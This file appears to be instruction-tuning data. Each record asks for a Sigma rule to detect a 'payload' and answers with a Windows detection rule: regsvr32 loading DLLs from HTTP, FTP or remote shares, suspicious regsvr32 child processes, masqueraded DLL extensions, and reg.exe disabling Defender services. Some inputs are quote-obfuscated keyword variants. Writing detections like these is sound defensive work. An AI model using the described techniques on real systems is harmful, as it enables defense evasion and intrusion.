{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32 REGSVR32 /i -i ftp http", "output": "title: Potentially Suspicious Regsvr32 HTTP/FTP Pattern\nid: 867356ee-9352-41c9-a8f2-1be690d78216\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects regsvr32 execution to download/install/register new DLLs that are hosted on Web or FTP servers.\nreferences:\n    - https://twitter.com/mrd0x/status/1461041276514623491\n    - https://twitter.com/tccontre18/status/1480950986650832903\n    - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/\nauthor: Florian Roth (Nextron Systems)\ndate: 2023-05-24\nmodified: 2023-05-26\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_flag:\n        CommandLine|contains:\n            - ' /i'\n            - ' -i'\n    selection_protocol:\n        CommandLine|contains:\n            - 'ftp'\n            - 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe REGSVR32.EXE /i -i ftp http", "output": "title: Potentially Suspicious Regsvr32 HTTP/FTP Pattern\nid: 867356ee-9352-41c9-a8f2-1be690d78216\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects regsvr32 execution to download/install/register new DLLs that are hosted on Web or FTP servers.\nreferences:\n    - https://twitter.com/mrd0x/status/1461041276514623491\n    - https://twitter.com/tccontre18/status/1480950986650832903\n    - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/\nauthor: Florian Roth (Nextron Systems)\ndate: 2023-05-24\nmodified: 2023-05-26\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_flag:\n        CommandLine|contains:\n            - ' /i'\n            - ' -i'\n    selection_protocol:\n        CommandLine|contains:\n            - 'ftp'\n            - 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe \\REGSVR32.EXE \\\\\\\\", "output": "title: Suspicious Regsvr32 Execution From Remote Share\nid: 88a87a10-384b-4ad7-8871-2f9bf9259ce5\nstatus: test\ndescription: Detects REGSVR32.exe to execute DLL hosted on remote shares\nreferences:\n    - https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-31\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: '\\REGSVR32.EXE'\n    selection_cli:\n        CommandLine|contains: ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\n# Decrease to medium if this is something common in your org\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe \\REGSV\"R32.EXE\" \\\\\\\\", "output": "title: Suspicious Regsvr32 Execution From Remote Share\nid: 88a87a10-384b-4ad7-8871-2f9bf9259ce5\nstatus: test\ndescription: Detects REGSVR32.exe to execute DLL hosted on remote shares\nreferences:\n    - https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-31\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: '\\REGSVR32.EXE'\n    selection_cli:\n        CommandLine|contains: ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\n# Decrease to medium if this is something common in your org\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32 \\REGSVR32 \\\\\\\\", "output": "title: Suspicious Regsvr32 Execution From Remote Share\nid: 88a87a10-384b-4ad7-8871-2f9bf9259ce5\nstatus: test\ndescription: Detects REGSVR32.exe to execute DLL hosted on remote shares\nreferences:\n    - https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-31\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: '\\REGSVR32.EXE'\n    selection_cli:\n        CommandLine|contains: ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\n# Decrease to medium if this is something common in your org\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe \\REGSVR32.EXE \\\\\\\\", "output": "title: Suspicious Regsvr32 Execution From Remote Share\nid: 88a87a10-384b-4ad7-8871-2f9bf9259ce5\nstatus: test\ndescription: Detects REGSVR32.exe to execute DLL hosted on remote shares\nreferences:\n    - https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-31\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: '\\REGSVR32.EXE'\n    selection_cli:\n        CommandLine|contains: ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\n# Decrease to medium if this is something common in your org\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe \\calc.exe \\cscript.exe \\explorer.exe \\mshta.exe \\net.exe \\net1.exe \\nltest.exe \\notepad.exe \\powershell.exe \\pwsh.exe \\reg.exe \\schtasks.exe \\werfault.exe \\wscript.exe \\werfault.exe -u -p", "output": "title: Potentially Suspicious Child Process Of Regsvr32\nid: 6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects potentially suspicious child processes of \"regsvr32.exe\".\nreferences:\n    - https://redcanary.com/blog/intelligence-insights-april-2022/\n    - https://www.echotrail.io/insights/search/regsvr32.exe\n    - https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo\nauthor: elhoim, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-05\nmodified: 2023-05-26\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\regsvr32.exe'\n        Image|endswith:\n            - '\\calc.exe'\n            - '\\cscript.exe'\n            - '\\explorer.exe'\n            - '\\mshta.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\nltest.exe'\n            - '\\notepad.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\reg.exe'\n            - '\\schtasks.exe'\n            - '\\werfault.exe'\n            - '\\wscript.exe'\n    filter_main_werfault:\n        Image|endswith: '\\werfault.exe'\n        CommandLine|contains: ' -u -p '\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely, but can rarely occur. Apply additional filters accordingly.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe \\calc.exe \\cscript.exe \\explorer.exe \\mshta.exe \\net\".exe\" \\net1.exe \\nltest.exe \\notepad.exe \\powershell.exe \\pwsh.exe \\reg.exe \\schtasks.exe \\werfault.exe \\wscript.exe \\werfault.exe -u -p", "output": "title: Potentially Suspicious Child Process Of Regsvr32\nid: 6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects potentially suspicious child processes of \"regsvr32.exe\".\nreferences:\n    - https://redcanary.com/blog/intelligence-insights-april-2022/\n    - https://www.echotrail.io/insights/search/regsvr32.exe\n    - https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo\nauthor: elhoim, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-05\nmodified: 2023-05-26\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\regsvr32.exe'\n        Image|endswith:\n            - '\\calc.exe'\n            - '\\cscript.exe'\n            - '\\explorer.exe'\n            - '\\mshta.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\nltest.exe'\n            - '\\notepad.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\reg.exe'\n            - '\\schtasks.exe'\n            - '\\werfault.exe'\n            - '\\wscript.exe'\n    filter_main_werfault:\n        Image|endswith: '\\werfault.exe'\n        CommandLine|contains: ' -u -p '\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely, but can rarely occur. Apply additional filters accordingly.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe \\calc.exe \\cscript.exe \\explorer.exe \\mshta.exe \\net.exe \\net1.exe \\nltest.exe \\notepad.exe \\powershell.exe \\pwsh.exe \\reg.exe \\schtasks.exe \\werfault.exe \\wscript.exe \\werfault.exe /u -p", "output": "title: Potentially Suspicious Child Process Of Regsvr32\nid: 6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects potentially suspicious child processes of \"regsvr32.exe\".\nreferences:\n    - https://redcanary.com/blog/intelligence-insights-april-2022/\n    - https://www.echotrail.io/insights/search/regsvr32.exe\n    - https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo\nauthor: elhoim, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-05\nmodified: 2023-05-26\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\regsvr32.exe'\n        Image|endswith:\n            - '\\calc.exe'\n            - '\\cscript.exe'\n            - '\\explorer.exe'\n            - '\\mshta.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\nltest.exe'\n            - '\\notepad.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\reg.exe'\n            - '\\schtasks.exe'\n            - '\\werfault.exe'\n            - '\\wscript.exe'\n    filter_main_werfault:\n        Image|endswith: '\\werfault.exe'\n        CommandLine|contains: ' -u -p '\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely, but can rarely occur. Apply additional filters accordingly.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32 \\calc \\cscript \\explorer \\mshta \\net \\net1 \\nltest \\notepad \\powershell \\pwsh \\reg \\schtasks \\werfault \\wscript \\werfault -u -p", "output": "title: Potentially Suspicious Child Process Of Regsvr32\nid: 6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects potentially suspicious child processes of \"regsvr32.exe\".\nreferences:\n    - https://redcanary.com/blog/intelligence-insights-april-2022/\n    - https://www.echotrail.io/insights/search/regsvr32.exe\n    - https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo\nauthor: elhoim, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-05\nmodified: 2023-05-26\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\regsvr32.exe'\n        Image|endswith:\n            - '\\calc.exe'\n            - '\\cscript.exe'\n            - '\\explorer.exe'\n            - '\\mshta.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\nltest.exe'\n            - '\\notepad.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\reg.exe'\n            - '\\schtasks.exe'\n            - '\\werfault.exe'\n            - '\\wscript.exe'\n    filter_main_werfault:\n        Image|endswith: '\\werfault.exe'\n        CommandLine|contains: ' -u -p '\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely, but can rarely occur. Apply additional filters accordingly.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe \\calc.exe \\cscript.exe \\explorer.exe \\mshta.exe \\net.exe \\net1.exe \\nltest.exe \\notepad.exe \\powershell.exe \\pwsh.exe \\reg.exe \\schtasks.exe \\werfault.exe \\wscript.exe \\werfault.exe -u -p", "output": "title: Potentially Suspicious Child Process Of Regsvr32\nid: 6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects potentially suspicious child processes of \"regsvr32.exe\".\nreferences:\n    - https://redcanary.com/blog/intelligence-insights-april-2022/\n    - https://www.echotrail.io/insights/search/regsvr32.exe\n    - https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo\nauthor: elhoim, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-05\nmodified: 2023-05-26\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\regsvr32.exe'\n        Image|endswith:\n            - '\\calc.exe'\n            - '\\cscript.exe'\n            - '\\explorer.exe'\n            - '\\mshta.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\nltest.exe'\n            - '\\notepad.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\reg.exe'\n            - '\\schtasks.exe'\n            - '\\werfault.exe'\n            - '\\wscript.exe'\n    filter_main_werfault:\n        Image|endswith: '\\werfault.exe'\n        CommandLine|contains: ' -u -p '\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely, but can rarely occur. Apply additional filters accordingly.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe REGSVR32.EXE", "output": "title: Regsvr32 DLL Execution With Suspicious File Extension\nid: 089fc3d2-71e8-4763-a8a5-c97fbb0a403e\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects the execution of REGSVR32.exe with DLL files masquerading as other files\nreferences:\n    - https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/\n    - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html\n    - https://guides.lib.umich.edu/c.php?g=282942&p=1885348\nauthor: Florian Roth (Nextron Systems), frack113\ndate: 2021-11-29\nmodified: 2023-05-24\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_cli:\n        CommandLine|endswith:\n            # Add more image extensions\n            # https://twitter.com/Max_Mal_/status/1542461200797163522/photo/3\n            - '.bin'\n            - '.bmp'\n            - '.cr2'\n            - '.dat'\n            - '.eps'\n            - '.gif'\n            - '.ico'\n            - '.jpeg'\n            - '.jpg'\n            - '.nef'\n            - '.orf'\n            - '.png'\n            - '.raw'\n            - '.sr2'\n            - '.temp'\n            - '.tif'\n            - '.tiff'\n            - '.tmp'\n            - '.rtf'\n            - '.txt'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe \\\"REGSVR\\\"32.EXE", "output": "title: Regsvr32 DLL Execution With Suspicious File Extension\nid: 089fc3d2-71e8-4763-a8a5-c97fbb0a403e\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects the execution of REGSVR32.exe with DLL files masquerading as other files\nreferences:\n    - https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/\n    - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html\n    - https://guides.lib.umich.edu/c.php?g=282942&p=1885348\nauthor: Florian Roth (Nextron Systems), frack113\ndate: 2021-11-29\nmodified: 2023-05-24\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_cli:\n        CommandLine|endswith:\n            # Add more image extensions\n            # https://twitter.com/Max_Mal_/status/1542461200797163522/photo/3\n            - '.bin'\n            - '.bmp'\n            - '.cr2'\n            - '.dat'\n            - '.eps'\n            - '.gif'\n            - '.ico'\n            - '.jpeg'\n            - '.jpg'\n            - '.nef'\n            - '.orf'\n            - '.png'\n            - '.raw'\n            - '.sr2'\n            - '.temp'\n            - '.tif'\n            - '.tiff'\n            - '.tmp'\n            - '.rtf'\n            - '.txt'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32 REGSVR32", "output": "title: Regsvr32 DLL Execution With Suspicious File Extension\nid: 089fc3d2-71e8-4763-a8a5-c97fbb0a403e\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects the execution of REGSVR32.exe with DLL files masquerading as other files\nreferences:\n    - https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/\n    - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html\n    - https://guides.lib.umich.edu/c.php?g=282942&p=1885348\nauthor: Florian Roth (Nextron Systems), frack113\ndate: 2021-11-29\nmodified: 2023-05-24\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_cli:\n        CommandLine|endswith:\n            # Add more image extensions\n            # https://twitter.com/Max_Mal_/status/1542461200797163522/photo/3\n            - '.bin'\n            - '.bmp'\n            - '.cr2'\n            - '.dat'\n            - '.eps'\n            - '.gif'\n            - '.ico'\n            - '.jpeg'\n            - '.jpg'\n            - '.nef'\n            - '.orf'\n            - '.png'\n            - '.raw'\n            - '.sr2'\n            - '.temp'\n            - '.tif'\n            - '.tiff'\n            - '.tmp'\n            - '.rtf'\n            - '.txt'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe REGSVR32.EXE", "output": "title: Regsvr32 DLL Execution With Suspicious File Extension\nid: 089fc3d2-71e8-4763-a8a5-c97fbb0a403e\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects the execution of REGSVR32.exe with DLL files masquerading as other files\nreferences:\n    - https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/\n    - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html\n    - https://guides.lib.umich.edu/c.php?g=282942&p=1885348\nauthor: Florian Roth (Nextron Systems), frack113\ndate: 2021-11-29\nmodified: 2023-05-24\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_cli:\n        CommandLine|endswith:\n            # Add more image extensions\n            # https://twitter.com/Max_Mal_/status/1542461200797163522/photo/3\n            - '.bin'\n            - '.bmp'\n            - '.cr2'\n            - '.dat'\n            - '.eps'\n            - '.gif'\n            - '.ico'\n            - '.jpeg'\n            - '.jpg'\n            - '.nef'\n            - '.orf'\n            - '.png'\n            - '.raw'\n            - '.sr2'\n            - '.temp'\n            - '.tif'\n            - '.tiff'\n            - '.tmp'\n            - '.rtf'\n            - '.txt'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe REGSVR32.EXE .ax .cpl .dll .ocx .ppl .bav", "output": "title: Regsvr32 DLL Execution With Uncommon Extension\nid: 50919691-7302-437f-8e10-1fe088afa145\nstatus: test\ndescription: Detects a \"regsvr32\" execution where the DLL doesn't contain a common file extension.\nreferences:\n    - https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-07-17\nmodified: 2023-05-24\ntags:\n    - attack.defense-evasion\n    - attack.t1574\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    filter_main_legit_ext:\n        CommandLine|contains:\n            # Note: For better accuracy you might not want to use contains\n            - '.ax'\n            - '.cpl'\n            - '.dll' # Covers \".dll.mui\"\n            - '.ocx'\n    filter_optional_pascal:\n        CommandLine|contains: '.ppl'\n    filter_optional_avg:\n        CommandLine|contains: '.bav'\n    filter_main_null_4688:\n        CommandLine: null\n    filter_main_empty_4688:\n        CommandLine: ''\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Other legitimate extensions currently not in the list either from third party or specific Windows components.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe REGSVR32.EXE .ax .cpl \\\".\\\"\\\"d\\\"\\\"l\\\"\\\"l\\\" .ocx .ppl .bav", "output": "title: Regsvr32 DLL Execution With Uncommon Extension\nid: 50919691-7302-437f-8e10-1fe088afa145\nstatus: test\ndescription: Detects a \"regsvr32\" execution where the DLL doesn't contain a common file extension.\nreferences:\n    - https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-07-17\nmodified: 2023-05-24\ntags:\n    - attack.defense-evasion\n    - attack.t1574\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    filter_main_legit_ext:\n        CommandLine|contains:\n            # Note: For better accuracy you might not want to use contains\n            - '.ax'\n            - '.cpl'\n            - '.dll' # Covers \".dll.mui\"\n            - '.ocx'\n    filter_optional_pascal:\n        CommandLine|contains: '.ppl'\n    filter_optional_avg:\n        CommandLine|contains: '.bav'\n    filter_main_null_4688:\n        CommandLine: null\n    filter_main_empty_4688:\n        CommandLine: ''\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Other legitimate extensions currently not in the list either from third party or specific Windows components.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe REGSVR32.EXE .ax .cpl .dll .ocx .ppl .bav", "output": "title: Regsvr32 DLL Execution With Uncommon Extension\nid: 50919691-7302-437f-8e10-1fe088afa145\nstatus: test\ndescription: Detects a \"regsvr32\" execution where the DLL doesn't contain a common file extension.\nreferences:\n    - https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-07-17\nmodified: 2023-05-24\ntags:\n    - attack.defense-evasion\n    - attack.t1574\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    filter_main_legit_ext:\n        CommandLine|contains:\n            # Note: For better accuracy you might not want to use contains\n            - '.ax'\n            - '.cpl'\n            - '.dll' # Covers \".dll.mui\"\n            - '.ocx'\n    filter_optional_pascal:\n        CommandLine|contains: '.ppl'\n    filter_optional_avg:\n        CommandLine|contains: '.bav'\n    filter_main_null_4688:\n        CommandLine: null\n    filter_main_empty_4688:\n        CommandLine: ''\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Other legitimate extensions currently not in the list either from third party or specific Windows components.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "reg add d 4 v Start \\AppIDSvc \\MsMpSvc \\NisSrv \\SecurityHealthService \\Sense \\UsoSvc \\WdBoot \\WdFilter \\WdNisDrv \\WdNisSvc \\WinDefend \\wscsvc \\wuauserv", "output": "title: Security Service Disabled Via Reg.EXE\nid: 5e95028c-5229-4214-afae-d653d573d0ec\nstatus: test\ndescription: Detects execution of \"reg.exe\" to disable security services such as Windows Defender.\nreferences:\n    - https://twitter.com/JohnLaTwC/status/1415295021041979392\n    - https://github.com/gordonbay/Windows-On-Reins/blob/e587ac7a0407847865926d575e3c46f68cf7c68d/wor.ps1\n    - https://vms.drweb.fr/virus/?i=24144899\n    - https://bidouillesecurity.com/disable-windows-defender-in-powershell/\nauthor: Florian Roth (Nextron Systems), John Lambert (idea), elhoim\ndate: 2021-07-14\nmodified: 2023-06-05\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_reg_add:\n        CommandLine|contains|all:\n            - 'reg'\n            - 'add'\n    selection_cli_reg_start:\n        CommandLine|contains|all:\n            - 'd 4'\n            - 'v Start'\n        CommandLine|contains:\n            - '\\AppIDSvc'\n            - '\\MsMpSvc'\n            - '\\NisSrv'\n            - '\\SecurityHealthService'\n            - '\\Sense'\n            - '\\UsoSvc'\n            - '\\WdBoot'\n            - '\\WdFilter'\n            - '\\WdNisDrv'\n            - '\\WdNisSvc'\n            - '\\WinDefend'\n            - '\\wscsvc'\n            - '\\wuauserv'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "reg add d 4 v Start \\AppIDSvc \\MsMpSvc \\NisSrv \\SecurityHealthService \\Sense \\UsoSvc \\WdBoot \\\"\\\\\"\\\"W\\\"\\\"d\\\"\\\"F\\\"\\\"i\\\"\\\"l\\\"\\\"t\\\"\\\"e\\\"\\\"r\\\" \\WdNisDrv \\WdNisSvc \\WinDefend \\wscsvc \\wuauserv", "output": "title: Security Service Disabled Via Reg.EXE\nid: 5e95028c-5229-4214-afae-d653d573d0ec\nstatus: test\ndescription: Detects execution of \"reg.exe\" to disable security services such as Windows Defender.\nreferences:\n    - https://twitter.com/JohnLaTwC/status/1415295021041979392\n    - https://github.com/gordonbay/Windows-On-Reins/blob/e587ac7a0407847865926d575e3c46f68cf7c68d/wor.ps1\n    - https://vms.drweb.fr/virus/?i=24144899\n    - https://bidouillesecurity.com/disable-windows-defender-in-powershell/\nauthor: Florian Roth (Nextron Systems), John Lambert (idea), elhoim\ndate: 2021-07-14\nmodified: 2023-06-05\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_reg_add:\n        CommandLine|contains|all:\n            - 'reg'\n            - 'add'\n    selection_cli_reg_start:\n        CommandLine|contains|all:\n            - 'd 4'\n            - 'v Start'\n        CommandLine|contains:\n            - '\\AppIDSvc'\n            - '\\MsMpSvc'\n            - '\\NisSrv'\n            - '\\SecurityHealthService'\n            - '\\Sense'\n            - '\\UsoSvc'\n            - '\\WdBoot'\n            - '\\WdFilter'\n            - '\\WdNisDrv'\n            - '\\WdNisSvc'\n            - '\\WinDefend'\n            - '\\wscsvc'\n            - '\\wuauserv'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "reg add d 4 v Start \\AppIDSvc \\MsMpSvc \\NisSrv \\SecurityHealthService \\Sense \\UsoSvc \\WdBoot \\WdFilter \\WdNisDrv \\WdNisSvc \\WinDefend \\wscsvc \\wuauserv", "output": "title: Security Service Disabled Via Reg.EXE\nid: 5e95028c-5229-4214-afae-d653d573d0ec\nstatus: test\ndescription: Detects execution of \"reg.exe\" to disable security services such as Windows Defender.\nreferences:\n    - https://twitter.com/JohnLaTwC/status/1415295021041979392\n    - https://github.com/gordonbay/Windows-On-Reins/blob/e587ac7a0407847865926d575e3c46f68cf7c68d/wor.ps1\n    - https://vms.drweb.fr/virus/?i=24144899\n    - https://bidouillesecurity.com/disable-windows-defender-in-powershell/\nauthor: Florian Roth (Nextron Systems), John Lambert (idea), elhoim\ndate: 2021-07-14\nmodified: 2023-06-05\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_reg_add:\n        CommandLine|contains|all:\n            - 'reg'\n            - 'add'\n    selection_cli_reg_start:\n        CommandLine|contains|all:\n            - 'd 4'\n            - 'v Start'\n        CommandLine|contains:\n            - '\\AppIDSvc'\n            - '\\MsMpSvc'\n            - '\\NisSrv'\n            - '\\SecurityHealthService'\n            - '\\Sense'\n            - '\\UsoSvc'\n            - '\\WdBoot'\n            - 